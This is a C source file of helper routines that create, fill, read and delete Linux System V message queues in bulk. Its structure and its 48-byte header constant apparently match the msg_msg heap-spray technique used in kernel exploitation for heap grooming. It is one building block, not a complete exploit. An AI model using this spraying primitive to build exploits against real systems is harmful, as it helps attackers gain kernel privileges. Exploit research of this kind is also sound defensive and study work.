#include "msg.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stddef.h>

#define MSG_HDR 48

void send_secondary(size_t size, int qid, uint8_t init){
    msg_t *msg = calloc(1, sizeof(msg_t) + size);
    if (init){
        memset(msg->mtext, qid, 8);
    }
    msg->mtype = MTYPE_SECONDARY;
    if(msgsnd(qid, msg, size - MSG_HDR, 0) < 0){
        perror("[-] msgsnd");
    }
    free(msg);
}

msg_t *msg_read(size_t size, int qid, int msgtyp, int msgflg){
    msg_t *msg = calloc(1, sizeof(msg_t) + size);
    if(msgrcv(qid, msg, size - MSG_HDR, msgtyp, msgflg) < 0) {
        perror("[-] msgrcv");
    }
    return msg;
}

void _msg_spray(size_t size, size_t count, int *qid, msg_t *msg, uint8_t init){
    for (size_t i = 0; i < count; i++) {
        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qid[i] < 0) {
            perror("[-] msgget");
        }
        if(init){
            memset(msg->mtext, qid[i], 8);
        }
        msg->mtype = MTYPE_PRIMARY;
        if(msgsnd(qid[i], msg, size - MSG_HDR, 0) < 0){
            perror("[-] msgsnd");
        }
    }
}

void msg_spray(size_t size, size_t count, int *qid){
    msg_t *msg = calloc(1, sizeof(msg_t) + size);
    _msg_spray(size, count, qid, msg, 1);
    free(msg);
}

void _msg_delete(size_t size, size_t count, int off, int *qid, msg_t *msg, long msgtyp, int msgflg){
    for (size_t i = off; i < count; i++) {
        printf("[*] Deleting msg 0x%x\n", qid[i]);
        if(msgrcv(qid[i], msg, size - MSG_HDR, msgtyp, msgflg) < 0) {
            perror("[-] msgrcv");
        }
    }
}

void msg_delete(size_t size, size_t count, int off, int *qid){
    msg_t *msg = calloc(1, sizeof(msg_t) + size);
    _msg_delete(size, count, off, qid, msg, 0, 0);
    free(msg);
}